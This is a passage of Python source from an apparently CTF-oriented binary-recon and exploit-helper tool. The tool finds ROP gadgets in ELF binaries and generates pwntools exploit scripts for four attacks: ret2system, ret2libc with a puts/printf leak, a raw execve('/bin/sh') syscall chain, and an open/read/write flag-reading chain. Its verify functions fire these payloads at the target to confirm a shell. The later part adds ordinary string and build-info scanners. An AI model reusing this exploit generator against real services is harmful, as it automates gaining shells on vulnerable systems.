    context.arch = "amd64"
    context.log_level = "critical"

    need_aslr_off = pop_rdi_bin is None and libc is not None
    if pop_rdi_bin is None and libc is None:
        return False, "no pop rdi gadget available anywhere to verify with"

    p = None
    try:
        p = process(elf.path, aslr=not need_aslr_off)
        if pop_rdi_bin is not None:
            pop_rdi_addr = pop_rdi_bin
        else:
            libc_base = None
            for _ in range(20):
                libs_seen = p.libs()
                for lib_path, base in libs_seen.items():
                    if os.path.basename(lib_path) == os.path.basename(libc.path):
                        libc_base = base
                        break
                if libc_base:
                    break
                time.sleep(0.1)
            if libc_base is None or pop_rdi_libc_offset is None:
                return False, "couldn't resolve a pop rdi gadget address for local verification"
            pop_rdi_addr = libc_base + pop_rdi_libc_offset

        payload = b"A" * offset + p64(pop_rdi_addr) + p64(binsh_addr)
        if align_ret is not None:
            payload += p64(align_ret)
        payload += p64(system_addr)
        p.sendline(payload)
        marker = f"BINRECON_OK_{os.getpid()}"
        return _recv_and_check_marker(p, marker)
    except Exception as e:
        return False, f"verification run failed: {e}"
    finally:
        if p is not None:
            try:
                p.close()
            except Exception:
                pass


def verify_strategy_b(elf, offset, leak_func, main_addr, pop_rdi_bin, libc, pop_rdi_libc_offset,
                       align_ret=None):
    """Actually run Strategy B (leak then ret2system) locally and confirm a shell.
    If align_ret is given, an extra bare 'ret' gadget is inserted right before
    the call to system() to fix x86-64 stack alignment (movaps crashes)."""
    from pwn import process, p64, context
    context.clear()
    context.arch = "amd64"
    context.log_level = "critical"

    if pop_rdi_bin is None:
        return False, "no pop rdi gadget in the binary — can't perform the pre-leak stage"
    if pop_rdi_libc_offset is None:
        return False, "no pop rdi gadget found in libc — can't perform the post-leak stage"

    libc.address = 0  # reset any stale base from a previous attempt (e.g. the non-aligned retry)

    p = None
    try:
        p = process(elf.path)
        base_leak_offset = libc.symbols[leak_func]
        payload1 = (b"A" * offset + p64(pop_rdi_bin) + p64(elf.got[leak_func]) +
                    p64(elf.plt[leak_func]) + p64(main_addr))
        p.sendline(payload1)
        leaked = _read_leak_u64(p)
        if leaked is None:
            return False, "leak stage produced no usable pointer-looking value"
        libc.address = leaked - base_leak_offset

        payload2 = b"A" * offset + p64(libc.address + pop_rdi_libc_offset) + p64(next(libc.search(b"/bin/sh")))
        if align_ret is not None:
            payload2 += p64(align_ret)
        payload2 += p64(libc.symbols["system"])
        p.sendline(payload2)
        marker = f"BINRECON_OK_{os.getpid()}"
        ok, msg = _recv_and_check_marker(p, marker)
        return ok, f"leaked libc base {hex(libc.address)}, {msg}"
    except Exception as e:
        return False, f"verification run failed: {e}"
    finally:
        if p is not None:
            try:
                p.close()
            except Exception:
                pass


def verify_strategy_c(elf, offset, binsh_addr, gadgets, mode="individual"):
    """Actually run the raw execve() syscall chain locally and confirm a shell."""
    from pwn import process, p64, context
    context.clear()
    context.arch = "amd64"
    context.log_level = "critical"

    p = None
    try:
        p = process(elf.path)
        payload = b"A" * offset
        payload += p64(gadgets["pop rax; ret"]) + p64(59)
        if mode == "combined":
            payload += p64(gadgets["combo3"]) + p64(binsh_addr) + p64(0) + p64(0)
        else:
            payload += p64(gadgets["pop rdi; ret"]) + p64(binsh_addr)
            payload += p64(gadgets["pop rsi; ret"]) + p64(0)
            payload += p64(gadgets["pop rdx; ret"]) + p64(0)
        payload += p64(gadgets["syscall"])
        p.sendline(payload)
        marker = f"BINRECON_OK_{os.getpid()}"
        return _recv_and_check_marker(p, marker)
    except Exception as e:
        return False, f"verification run failed: {e}"
    finally:
        if p is not None:
            try:
                p.close()
            except Exception:
                pass


def verify_strategy_d(elf, offset, flag_addr, bss_addr, syscall_ret, gadgets, mode="individual",
                       expected_marker=None):
    """Actually run the open+read+write flag-reading chain locally and confirm
    the flag file's content comes back over the socket."""
    from pwn import process, p64, context
    context.clear()
    context.arch = "amd64"
    context.log_level = "critical"

    def emit(payload, rax_val, a1, a2, a3):
        payload += p64(gadgets["pop rax; ret"]) + p64(rax_val)
        if mode == "combined":
            payload += p64(gadgets["combo3"]) + p64(a1) + p64(a2) + p64(a3)
        else:
            payload += p64(gadgets["pop rdi; ret"]) + p64(a1)
            payload += p64(gadgets["pop rsi; ret"]) + p64(a2)
            payload += p64(gadgets["pop rdx; ret"]) + p64(a3)
        payload += p64(syscall_ret)
        return payload

    p = None
    try:
        target_dir = os.path.dirname(os.path.abspath(elf.path)) or "."
        p = process(elf.path, cwd=target_dir)
        payload = b"A" * offset
        payload = emit(payload, 2, flag_addr, 0, 0)          # open(flag, O_RDONLY)
        payload = emit(payload, 0, 3, bss_addr, 0x200)       # read(3, buf, 0x200)
        payload = emit(payload, 1, 1, bss_addr, 0x200)       # write(1, buf, 0x200)
        p.sendline(payload)
        time.sleep(0.5)
        try:
            data = p.recvrepeat(timeout=3)
        except Exception as e:
            return False, f"no response after sending payload ({e})"

        # The buffer we read/wrote is null-padded and may be preceded by an
        # unrelated echo of our own payload (if the target prints its input
        # before the chain fires) — strip trailing nulls and pull out the
        # last non-empty line, which is where the actual file content lands.
        cleaned = data.rstrip(b"\x00")
        lines = [l for l in cleaned.split(b"\n") if l.strip(b"\x00")]
        shown = lines[-1] if lines else cleaned[-80:]

        if expected_marker and expected_marker.encode() in data:
            return True, f"flag content confirmed in output: {shown!r}"
        if lines:
            return True, f"got output back: {shown!r}"
        return False, "no output came back — open/read/write chain likely didn't complete"
    except Exception as e:
        return False, f"verification run failed: {e}"
    finally:
        if p is not None:
            try:
                p.close()
            except Exception:
                pass


def print_verification_result(ok, msg):
    if ok:
        print(f"\n  {C.BOLD}{C.GREEN}[✓] VERIFIED WORKING locally — {msg}{C.RESET}")
    else:
        print(f"\n  {C.BOLD}{C.RED}[✗] Local verification failed — {msg}{C.RESET}")


def verify_with_alignment_retry(verify_fn, *args, ret_gadget=None, **kwargs):
    """Try a verify_strategy_* function first without a stack-alignment fixup,
    then with one (inserting a bare 'ret' before the libc call) if the plain
    attempt failed and a ret gadget is available — x86-64 glibc internals
    (movaps) require 16-byte stack alignment at call time, and this parity
    can go either way depending on the exact gadget chain used.
    Returns (ok, msg, used_align_fix: bool)."""
    ok, msg = verify_fn(*args, **kwargs, align_ret=None)
    if ok or ret_gadget is None:
        return ok, msg, False
    ok2, msg2 = verify_fn(*args, **kwargs, align_ret=ret_gadget)
    if ok2:
        return True, msg2, True
    return False, f"{msg}; with alignment fix: {msg2}", False


def show_exploit_helper(path, elf, args, summary=None):
    banner("EXPLOIT HELPER (ret2libc / ret2system)")

    plt = elf.plt
    symbols = elf.symbols
    bits = elf.bits

    have_system = "system" in plt
    have_puts = "puts" in plt
    have_printf = "printf" in plt
    input_names = {"gets", "scanf", "__isoc99_scanf", "read", "fgets"}
    found_inputs = sorted(n for n in input_names if n in plt or n in symbols)

    try:
        binsh_addr = next(elf.search(b"/bin/sh\x00"))
    except StopIteration:
        binsh_addr = None

    libc = None
    try:
        libc = elf.libc
    except Exception:
        libc = None

    text_data, text_base = get_text_section(elf)
    gadget_patterns = GADGET_PATTERNS_64 if bits == 64 else GADGET_PATTERNS_32
    bin_gadgets = find_gadgets(text_data, text_base, gadget_patterns) if text_data else {}
    pop_rdi_bin, pop_rdi_bin_fallback = _first_gadget_with_fallback(bin_gadgets, "pop rdi; ret", path)
    ret_gadget = _first_gadget(bin_gadgets, "ret")

    pop_rdi_libc_offset = None
    pop_rdi_libc_fallback = False
    if libc is not None and bits == 64:
        libc_text_data, libc_text_base = get_text_section(libc)
        libc_gadgets = find_gadgets(libc_text_data, libc_text_base, GADGET_PATTERNS_64) if libc_text_data else {}
        pop_rdi_libc_offset, pop_rdi_libc_fallback = _first_gadget_with_fallback(
            libc_gadgets, "pop rdi; ret", libc.path)

    kv("system() in PLT", "Yes" if have_system else "No", C.GREEN if have_system else C.RED, key_width=26)
    kv("\"/bin/sh\" in binary", "Yes" if binsh_addr else "No", C.GREEN if binsh_addr else C.YELLOW, key_width=26)
    kv("puts()/printf() (leak)", "Yes" if (have_puts or have_printf) else "No",
       C.GREEN if (have_puts or have_printf) else C.RED, key_width=26)
    kv("Input function found", ", ".join(found_inputs) if found_inputs else "None found", C.CYAN, key_width=26)
    kv("Local libc resolved", libc.path if libc else "No", C.GREEN if libc else C.YELLOW, key_width=26)
    if bits == 64:
        kv("pop rdi; ret (binary)", hex(pop_rdi_bin) if pop_rdi_bin else "Not found", key_width=26,
           color=C.GREEN if pop_rdi_bin else C.YELLOW)
        if pop_rdi_bin_fallback:
            note("Not in our own byte-scan — found via ROPgadget/ropper fallback instead")
        if pop_rdi_libc_fallback:
            note("libc's pop rdi; ret also came from the ROPgadget/ropper fallback, not our own scan")

    if elf.pie:
        note("PIE is enabled — the addresses below are file-relative. You'll need a separate "
             "leak of the binary's own base before they're valid at runtime (or test with ASLR off)")
    if elf.canary:
        note("Stack canary is enabled — you'll need to leak or otherwise bypass it before "
             "a raw offset overwrite like this will work")

    # ── Auto-offset (opt-in, actually runs the target) ──
    offset_value = None
    if args.auto_offset:
        print(f"\n  {C.YELLOW}[!] --auto-offset: running the target locally with a cyclic "
              f"pattern (timeout {args.auto_offset_timeout}s)...{C.RESET}")
        offset_value, msg = find_offset_dynamic(path, elf, timeout=args.auto_offset_timeout)
        if offset_value is not None:
            print(f"  {C.GREEN}[+] Detected OFFSET = {offset_value} ({msg}){C.RESET}")
        else:
            print(f"  {C.YELLOW}[!] Could not auto-detect an offset: {msg}{C.RESET}")

    if offset_value is not None:
        offset_line = f"OFFSET = {offset_value}              # auto-detected via --auto-offset"
    else:
        offset_line = "OFFSET = <FILL IN>          # bytes to reach the saved return address (use cyclic())"
        if not args.auto_offset:
            note("Add --auto-offset to have this tool run the target and detect OFFSET automatically")

    can_verify = args.auto_offset and offset_value is not None
    if args.auto_offset and offset_value is not None:
        if elf.pie:
            note("Skipping local auto-verify: PIE is enabled (needs an extra base leak this tool "
                 "doesn't automate)")
            can_verify = False
        elif bits != 64:
            note("Skipping local auto-verify: only implemented for x86-64 targets right now")
            can_verify = False

    # ── Strategy selection ──
    strategy = None
    if have_system and binsh_addr:
        strategy = "A"
    elif have_puts or have_printf:
        strategy = "B"

    # Resolve syscall-arg gadgets once (independent of what we'll use them for).
    # Prefer a single combined "pop rdi; pop rsi; pop rdx; ret" gadget when the
    # binary has one (shorter chain); fall back to three separate 2-instruction
    # gadgets otherwise.
    syscall_gadgets = {}
    syscall_mode = None
    syscall_gadgets_from_fallback = False
    combo3, fb1 = _first_gadget_with_fallback(bin_gadgets, "pop rdi; pop rsi; pop rdx; ret", path)
    pop_rax_g, fb2 = _first_gadget_with_fallback(bin_gadgets, "pop rax; ret", path)
    syscall_g, fb3 = _first_gadget_with_fallback(bin_gadgets, "syscall", path)
    if bits == 64 and pop_rax_g and syscall_g:
        if combo3:
            syscall_gadgets = {"pop rax; ret": pop_rax_g, "combo3": combo3, "syscall": syscall_g}
            syscall_mode = "combined"
            syscall_gadgets_from_fallback = fb1 or fb2 or fb3
        else:
            rdi_g, fb4 = _first_gadget_with_fallback(bin_gadgets, "pop rdi; ret", path)
            rsi_g, fb5 = _first_gadget_with_fallback(bin_gadgets, "pop rsi; ret", path)
            rdx_g, fb6 = _first_gadget_with_fallback(bin_gadgets, "pop rdx; ret", path)
            if rdi_g and rsi_g and rdx_g:
                syscall_gadgets = {
                    "pop rax; ret": pop_rax_g, "pop rdi; ret": rdi_g,
                    "pop rsi; ret": rsi_g, "pop rdx; ret": rdx_g,
                    "syscall": syscall_g,
                }
                syscall_mode = "individual"
                syscall_gadgets_from_fallback = any((fb2, fb3, fb4, fb5, fb6))

    # Strategy C: raw execve("/bin/sh") — needs the syscall gadgets above plus
    # a "/bin/sh"-style string already sitting in the binary. execve() never
    # returns on success, so a bare "syscall" (no trailing ret) is fine here.
    strategy_c_ready = bool(binsh_addr and syscall_mode)

    # Strategy D: open("<flag>") -> read(3, buf, N) -> write(1, buf, N) — a
    # CTF-style "just cat the flag" chain. Unlike execve(), each of these
    # syscalls DOES return and needs to hand control back to the next gadget,
    # so this specifically requires a "syscall; ret" gadget (not just a bare
    # "syscall") — otherwise there's nowhere controlled to return to between
    # the three calls. Also needs a flag-like filename and a writable .bss
    # buffer to read into.
    flag_addr, flag_name = (None, None)
    bss_addr = None
    syscall_ret_g, fb7 = _first_gadget_with_fallback(bin_gadgets, "syscall; ret", path)
    syscall_gadgets_from_fallback = syscall_gadgets_from_fallback or fb7
    strategy_d_ready = False
    if syscall_mode and syscall_ret_g:
        flag_addr, flag_name = find_flag_filename(path, elf)
        if flag_addr:
            try:
                bss = elf.get_section_by_name(".bss")
                if bss is not None:
                    bss_addr = bss.header.sh_addr
            except Exception:
                bss_addr = None
        strategy_d_ready = bool(flag_addr and bss_addr)

    if summary is not None:
        if strategy:
            summary["exploit_strategy"] = strategy
        elif strategy_c_ready:
            summary["exploit_strategy"] = "C"
        elif strategy_d_ready:
            summary["exploit_strategy"] = "D"
        else:
            summary["exploit_strategy"] = None

    if strategy is None and not strategy_c_ready and not strategy_d_ready:
        print(f"\n  {C.YELLOW}No clear ret2system/ret2libc/execve path found — this binary may "
              f"need a different technique{C.RESET}")
        return

    leak_func = "puts" if have_puts else "printf"
    main_addr = symbols.get("main", elf.entry)
    exit_addr = plt.get("exit", 0xdeadbeef)

    if strategy:
        print(f"\n  {C.BOLD}{C.GREEN}Strategy {strategy}: "
              f"{'Direct ret2system (no leak needed)' if strategy == 'A' else 'Leak libc base, then ret2system'}"
              f"{C.RESET}\n")

        verify_ok, verify_msg, align_used = None, None, False

        if strategy == "A":
            if bits == 64:
                if can_verify:
                    verify_ok, verify_msg, align_used = verify_with_alignment_retry(
                        verify_strategy_a, elf, offset_value, binsh_addr, plt["system"],
                        pop_rdi_bin, libc, pop_rdi_libc_offset, ret_gadget=ret_gadget)

                pop_rdi_line = (f"POP_RDI = {hex(pop_rdi_bin)}          # pop rdi; ret (found in the binary)"
                                 if pop_rdi_bin else
                                 f"POP_RDI = <FILL IN>         # e.g.: ROPgadget --binary {path} --only 'pop|ret' | grep rdi")

                align_line = ""
                align_payload_line = ""
                if align_used and ret_gadget is not None:
                    align_line = (f"ALIGN_RET = {hex(ret_gadget)}      # extra ret — fixes x86-64 stack "
                                   f"alignment for glibc's internal movaps\n")
                    align_payload_line = "payload += p64(ALIGN_RET)          # stack-alignment fixup\n"

                script = f"""from pwn import *

elf = ELF({path!r})
p = process(elf.path)  # or: p = remote('HOST', PORT)

{offset_line}
{pop_rdi_line}
{align_line}payload  = b'A' * OFFSET
payload += p64(POP_RDI)
payload += p64({hex(binsh_addr)})   # "/bin/sh" found inside the binary
{align_payload_line}payload += p64({hex(plt['system'])})   # system@plt

p.sendline(payload)
p.interactive()
"""
            else:
                script = f"""from pwn import *

elf = ELF({path!r})
p = process(elf.path)  # or: p = remote('HOST', PORT)

{offset_line}

payload  = b'A' * OFFSET
payload += p32({hex(plt['system'])})   # system@plt
payload += p32({hex(exit_addr)})       # fake return addr for after system() (exit@plt)
payload += p32({hex(binsh_addr)})      # "/bin/sh" found inside the binary

p.sendline(payload)
p.interactive()
"""
        else:  # strategy B
            libc_line = f"libc = ELF({libc.path!r})  # resolved from this system — verify it matches the TARGET's libc" \
                if libc else \
                "libc = ELF('./libc.so.6')  # <-- put the TARGET's matching libc here (see libc.rip / libc-database)"

            if bits == 64:
                if can_verify:
                    verify_ok, verify_msg, align_used = verify_with_alignment_retry(
                        verify_strategy_b, elf, offset_value, leak_func, main_addr,
                        pop_rdi_bin, libc, pop_rdi_libc_offset, ret_gadget=ret_gadget)

                pop_rdi_line = (f"POP_RDI = {hex(pop_rdi_bin)}          # pop rdi; ret (found in the binary, "
                                 f"safe to use pre-leak)"
                                 if pop_rdi_bin else
                                 f"POP_RDI = <FILL IN>         # e.g.: ROPgadget --binary {path} --only 'pop|ret' | grep rdi")
                pop_rdi_libc_line = (f"POP_RDI_LIBC_OFFSET = {hex(pop_rdi_libc_offset)}   "
                                      f"# pop rdi; ret, offset within libc"
                                      if pop_rdi_libc_offset else
                                      "POP_RDI_LIBC_OFFSET = <FILL IN>   # find with: ROPgadget --binary "
                                      "<libc.so.6> --only 'pop|ret' | grep rdi")

                align_line = ""
                align_payload_line = ""
                if align_used and ret_gadget is not None:
                    align_line = (f"ALIGN_RET = {hex(ret_gadget)}      # extra ret — fixes x86-64 stack "
                                   f"alignment for glibc's internal movaps\n")
                    align_payload_line = "payload2 += p64(ALIGN_RET)          # stack-alignment fixup\n"

                script = f"""from pwn import *

elf  = ELF({path!r})
{libc_line}
p = process(elf.path)  # or: p = remote('HOST', PORT)

{offset_line}
{pop_rdi_line}
{pop_rdi_libc_line}
{align_line}
# Stage 1: leak {leak_func}() to recover the libc base
payload1  = b'A' * OFFSET
payload1 += p64(POP_RDI)
payload1 += p64(elf.got['{leak_func}'])
payload1 += p64(elf.plt['{leak_func}'])
payload1 += p64({hex(main_addr)})   # return to main to send stage 2

p.sendline(payload1)
leaked = u64(p.recvline().strip().ljust(8, b'\\x00'))
libc.address = leaked - libc.symbols['{leak_func}']
log.info(f"libc base: {{hex(libc.address)}}")

# Stage 2: ret2system now that the libc base is known
payload2  = b'A' * OFFSET
payload2 += p64(libc.address + POP_RDI_LIBC_OFFSET)
payload2 += p64(next(libc.search(b'/bin/sh')))
{align_payload_line}payload2 += p64(libc.symbols['system'])

p.sendline(payload2)
p.interactive()
"""
            else:
                script = f"""from pwn import *

elf  = ELF({path!r})
{libc_line}
p = process(elf.path)  # or: p = remote('HOST', PORT)

{offset_line}

# Stage 1: leak {leak_func}() to recover the libc base
payload1  = b'A' * OFFSET
payload1 += p32(elf.plt['{leak_func}'])
payload1 += p32({hex(main_addr)})          # return to main to send stage 2
payload1 += p32(elf.got['{leak_func}'])    # argument to {leak_func}()

p.sendline(payload1)
leaked = u32(p.recvline().strip().ljust(4, b'\\x00'))
libc.address = leaked - libc.symbols['{leak_func}']
log.info(f"libc base: {{hex(libc.address)}}")

# Stage 2: ret2system now that the libc base is known
payload2  = b'A' * OFFSET
payload2 += p32(libc.symbols['system'])
payload2 += p32(0xdeadbeef)                # fake return addr, rarely matters
payload2 += p32(next(libc.search(b'/bin/sh')))

p.sendline(payload2)
p.interactive()
"""

        for line in script.strip("\n").split("\n"):
            print(f"  {C.GRAY}{line}{C.RESET}")

        if bits == 64 and pop_rdi_bin is None:
            note("No `pop rdi; ret` found in the binary's own .text — run with --section gadgets "
                 "to search more broadly (including libc)")

        if can_verify and verify_ok is not None:
            print_verification_result(verify_ok, verify_msg)

    # ── Strategy C: raw execve syscall chain (no libc/system needed at all) ──
    if strategy_c_ready:
        label = " (bonus alternative)" if strategy else ""
        print(f"\n  {C.BOLD}{C.GREEN}Strategy C{label}: raw execve(\"/bin/sh\") syscall chain "
              f"— no libc/system() needed{C.RESET}\n")
        if syscall_gadgets_from_fallback:
            note("One or more of these gadgets weren't in our own byte-scan — filled in via "
                 "a ROPgadget/ropper fallback pass instead")

        if syscall_mode == "combined":
            script_c = f"""from pwn import *

elf = ELF({path!r})
p = process(elf.path)  # or: p = remote('HOST', PORT)

{offset_line}
POP_RAX = {hex(syscall_gadgets['pop rax; ret'])}
POP_RDI_RSI_RDX = {hex(syscall_gadgets['combo3'])}   # pop rdi; pop rsi; pop rdx; ret — one gadget, shorter chain
SYSCALL = {hex(syscall_gadgets['syscall'])}

payload  = b'A' * OFFSET
payload += p64(POP_RAX) + p64(59)              # execve syscall number
payload += p64(POP_RDI_RSI_RDX)
payload += p64({hex(binsh_addr)})              # rdi = "/bin/sh"
payload += p64(0)                              # rsi = argv = NULL
payload += p64(0)                              # rdx = envp = NULL
payload += p64(SYSCALL)

p.sendline(payload)
p.interactive()
"""
        else:
            script_c = f"""from pwn import *

elf = ELF({path!r})
p = process(elf.path)  # or: p = remote('HOST', PORT)

{offset_line}
POP_RAX = {hex(syscall_gadgets['pop rax; ret'])}
POP_RDI = {hex(syscall_gadgets['pop rdi; ret'])}
POP_RSI = {hex(syscall_gadgets['pop rsi; ret'])}
POP_RDX = {hex(syscall_gadgets['pop rdx; ret'])}
SYSCALL = {hex(syscall_gadgets['syscall'])}

payload  = b'A' * OFFSET
payload += p64(POP_RAX) + p64(59)              # execve syscall number
payload += p64(POP_RDI) + p64({hex(binsh_addr)})   # "/bin/sh"
payload += p64(POP_RSI) + p64(0)               # argv = NULL
payload += p64(POP_RDX) + p64(0)               # envp = NULL
payload += p64(SYSCALL)

p.sendline(payload)
p.interactive()
"""
        for line in script_c.strip("\n").split("\n"):
            print(f"  {C.GRAY}{line}{C.RESET}")
        note("This chain uses only gadgets found inside the binary itself — works even "
             "without libc, and is unaffected by which libc version is on the target")

        if can_verify:
            ok, msg = verify_strategy_c(elf, offset_value, binsh_addr, syscall_gadgets, mode=syscall_mode)
            print_verification_result(ok, msg)
    elif bits == 64 and binsh_addr and not strategy:
        missing = [n for n in ["pop rax; ret", "pop rdi; ret", "pop rsi; ret", "pop rdx; ret", "syscall"]
                   if n not in bin_gadgets]
        note(f"A raw execve() syscall chain would also work here, but these gadgets are "
             f"missing from the binary: {', '.join(missing)}")

    # ── Strategy D: open()+read()+write() flag-reading chain ──
    if strategy_d_ready:
        label = " (bonus alternative)" if (strategy or strategy_c_ready) else ""
        print(f"\n  {C.BOLD}{C.GREEN}Strategy D{label}: open+read+write \"{flag_name}\" — "
              f"no libc/system() and no shell needed{C.RESET}\n")

        if syscall_mode == "combined":
            gadget_lines = f"POP_RAX = {hex(syscall_gadgets['pop rax; ret'])}\n" \
                            f"POP_RDI_RSI_RDX = {hex(syscall_gadgets['combo3'])}"
            def _block(rax_val, a1, a2, a3, comment):
                return (f"payload += p64(POP_RAX) + p64({rax_val})              # {comment}\n"
                        f"payload += p64(POP_RDI_RSI_RDX) + p64({a1}) + p64({a2}) + p64({a3})\n"
                        f"payload += p64(SYSCALL)")
        else:
            gadget_lines = f"POP_RAX = {hex(syscall_gadgets['pop rax; ret'])}\n" \
                            f"POP_RDI = {hex(syscall_gadgets['pop rdi; ret'])}\n" \
                            f"POP_RSI = {hex(syscall_gadgets['pop rsi; ret'])}\n" \
                            f"POP_RDX = {hex(syscall_gadgets['pop rdx; ret'])}"
            def _block(rax_val, a1, a2, a3, comment):
                return (f"payload += p64(POP_RAX) + p64({rax_val})              # {comment}\n"
                        f"payload += p64(POP_RDI) + p64({a1})\n"
                        f"payload += p64(POP_RSI) + p64({a2})\n"
                        f"payload += p64(POP_RDX) + p64({a3})\n"
                        f"payload += p64(SYSCALL)")

        open_block = _block(2, hex(flag_addr), 0, 0, "open(flag, O_RDONLY)")
        read_block = _block(0, 3, hex(bss_addr), 0x200, "read(3, buf, 0x200) — assumes flag opened as fd 3")
        write_block = _block(1, 1, hex(bss_addr), 0x200, "write(1, buf, 0x200)")

        script_d = f"""from pwn import *

elf = ELF({path!r})
p = process(elf.path)  # or: p = remote('HOST', PORT)

{offset_line}
{gadget_lines}
SYSCALL = {hex(syscall_ret_g)}   # syscall; ret — needs the ret so we can chain 3 syscalls

payload  = b'A' * OFFSET
{open_block}
{read_block}
{write_block}

p.sendline(payload)
print(p.recvall(timeout=3))
"""
        for line in script_d.strip("\n").split("\n"):
            print(f"  {C.GRAY}{line}{C.RESET}")
        note(f"Found the string {flag_name!r} in the binary and a writable .bss buffer at "
             f"{hex(bss_addr)} to read into")
        note("Assumes the target file gets file descriptor 3 (the next free one after "
             "stdin/stdout/stderr) — true unless the program already opened something else first")
        note(f"The filename is relative — run this from the same directory as the binary "
             f"(or wherever {flag_name!r} actually lives on the target)")

        if can_verify:
            ok, msg = verify_strategy_d(elf, offset_value, flag_addr, bss_addr, syscall_ret_g,
                                         syscall_gadgets, mode=syscall_mode)
            print_verification_result(ok, msg)
    elif bits == 64 and not strategy and not strategy_c_ready:
        flag_probe, flag_probe_name = find_flag_filename(path, elf)
        if flag_probe:
            note(f"Found a possible flag filename ({flag_probe_name!r}) but couldn't build an "
                 f"open/read/write chain — missing syscall-arg gadgets and/or a writable .bss section")




def find_interesting_strings(rows):
    # Repetitive/structured text (e.g. "aaaaaaaa...", "00000000...") can still
    # match the blob-length regexes below without actually being a real
    # hash/key/encoded-payload — gate those two specifically on entropy so
    # only genuinely random-looking data gets flagged.
    blob_min_entropy = {"HEX_BLOB": 2.5, "BASE64_BLOB": 3.5}

    matches = []
    for offset, text in rows:
        for tag, pattern in INTERESTING_PATTERNS:
            m = pattern.search(text)
            if not m:
                continue
            if tag in blob_min_entropy:
                if shannon_entropy(m.group().encode()) < blob_min_entropy[tag]:
                    continue  # too repetitive to be real random data — try other patterns
            matches.append((tag, offset, text))
            break
    return matches


def show_interesting_strings(rows, args, summary=None):
    banner("INTERESTING STRINGS")
    matches = find_interesting_strings(rows)

    if summary is not None:
        summary["interesting_count"] = len(matches)

    if not matches:
        print(f"  {C.YELLOW}No URLs, IPs, paths, credential-like strings, or format-string "
              f"patterns found{C.RESET}")
        return

    total = len(matches)
    shown = matches if args.all else matches[:args.limit]
    tag_color = {
        "PRIVATE_KEY": C.RED, "AWS_KEY": C.RED, "CREDENTIAL": C.RED, "SHELL_CMD": C.RED,
        "CRYPTO_WALLET": C.RED,
        "JWT": C.YELLOW, "SQL_QUERY": C.YELLOW, "FORMAT_STR": C.YELLOW,
        "REGISTRY_KEY": C.YELLOW, "IP_PORT": C.YELLOW, "IP": C.YELLOW,
        "URL": C.CYAN, "EMAIL": C.CYAN, "GUID": C.CYAN, "USER_AGENT": C.CYAN,
        "WIN_PATH": C.MAGENTA, "UNIX_PATH": C.MAGENTA,
        "BASE64_BLOB": C.GRAY, "HEX_BLOB": C.GRAY,
    }
    print(f"  {C.BOLD}{'Tag':<14}{'Offset':<12}{'String'}{C.RESET}")
    print(f"  {C.GRAY}{'-' * 60}{C.RESET}")
    for tag, offset, text in shown:
        display = text if len(text) <= 90 else text[:87] + "..."
        color = tag_color.get(tag, C.RESET)
        print(f"  {color}{tag:<14}{C.RESET}0x{offset:08x}   {C.BOLD}{display}{C.RESET}")
    if not args.all and total > args.limit:
        remaining_note(total - args.limit, args.limit)
    note("Categories: PRIVATE_KEY, AWS_KEY, JWT, CRYPTO_WALLET, CREDENTIAL, SHELL_CMD, SQL_QUERY, "
         "FORMAT_STR, REGISTRY_KEY, GUID, USER_AGENT, URL, EMAIL, IP_PORT, IP, WIN_PATH, UNIX_PATH, "
         "BASE64_BLOB, HEX_BLOB")


def show_build_info_elf(path, elf):
    banner("BUILD INFO")
    comment = None
    try:
        sec = elf.get_section_by_name(".comment")
        if sec is not None:
            comment = sec.data().decode(errors="ignore").replace("\x00", " | ").strip(" |")
    except Exception:
        pass
    if comment:
        kv("Compiler", comment)
    else:
        kv("Compiler", "Unknown (no .comment section)", C.YELLOW)
        note("Likely stripped, or built with a toolchain that doesn't emit this section")

    build_id = None
    try:
        out = subprocess.run(["file", path], capture_output=True, text=True).stdout
        m = re.search(r"BuildID\[\w+\]=([0-9a-fA-F]+)", out)
        if m:
            build_id = m.group(1)
    except Exception:
        pass
    kv("Build ID", build_id if build_id else "Not present", C.CYAN if build_id else C.YELLOW)


def show_build_info_pe(pe):
    banner("BUILD INFO")
    ts = pe.FILE_HEADER.TimeDateStamp
    try:
        dt = datetime.fromtimestamp(ts, tz=timezone.utc)
        kv("Compile Timestamp", f"{dt.strftime('%Y-%m-%d %H:%M:%S')} UTC (raw 0x{ts:x})", C.CYAN)
        note("A timestamp far in the past/future can mean it was deliberately altered to mislead analysts")
    except (OverflowError, OSError, ValueError):
        kv("Compile Timestamp", f"raw 0x{ts:x} (out of range, likely zeroed/faked)", C.YELLOW)

    kv("Linker Version", f"{pe.OPTIONAL_HEADER.MajorLinkerVersion}.{pe.OPTIONAL_HEADER.MinorLinkerVersion}")

    pdb_path = None
    if hasattr(pe, "DIRECTORY_ENTRY_DEBUG"):
        for dbg in pe.DIRECTORY_ENTRY_DEBUG:
            entry = getattr(dbg, "entry", None)
            name = getattr(entry, "PdbFileName", None) if entry else None
            if name:
                pdb_path = name.decode(errors="ignore").rstrip("\x00")
                break
    if pdb_path:
        kv("PDB Path", pdb_path, C.CYAN)
        note("Leaks the original build machine's path/username — useful for attribution")
    else:
        kv("PDB Path", "Not present / stripped")


def resolve_symbol(addr, funcs):
    """Find which function (if any) contains addr, and the offset into it — GDB style."""
    if not funcs:
        return None, None
    for name, f in funcs.items():
        size = f.size if f.size else 1
        if f.address <= addr < f.address + size:
            return name, addr - f.address
    return None, None


def addr_line(addr, name, color=C.CYAN, bits=64, funcs=None):
    width = 8 if bits == 32 else 16
    addr_str = f"0x{addr:0{width}x}"

    fname, offset = resolve_symbol(addr, funcs)
    if fname:
        addr_str += f" <{fname}+0x{offset:x}>"

    styled = f"{C.BOLD}{color}{addr_str}{C.RESET}"
    col_width = 34  # fixed visual column so annotated/plain addresses both align reasonably
    plain_len = len(addr_str)
    fill = " " * max(1, col_width - plain_len)
    print(f"  {styled}{fill}{C.BOLD}{name}{C.RESET}")


def detect_filetype(path):
    with open(path, "rb") as f:
        magic = f.read(4)
    if magic[:4] == b"\x7fELF":
        return "ELF"
    if magic[:2] == b"MZ":
        return "PE"
    return "UNKNOWN"


def get_file_info(path):
    banner("FILE INFO")
    try:
        out = subprocess.run(["file", path], capture_output=True, text=True).stdout.strip()
        info = out.split(":", 1)[1].strip() if ":" in out else out
        kv("Type", info)
    except FileNotFoundError:
        kv("Type", "[!] 'file' utility not found on this system", C.RED)

    size = os.path.getsize(path)
    kv("Size", f"{size:,} bytes ({size / 1024:.1f} KB)")
    kv("Path", str(Path(path).resolve()))


def extract_strings(path, min_len=4):
    """Pure-python equivalent of `strings <file>`: yields (offset, text) for
    runs of printable ASCII bytes at least min_len long. Uses a single regex
    pass over the whole buffer instead of a byte-by-byte Python loop."""
    with open(path, "rb") as f:
        data = f.read()

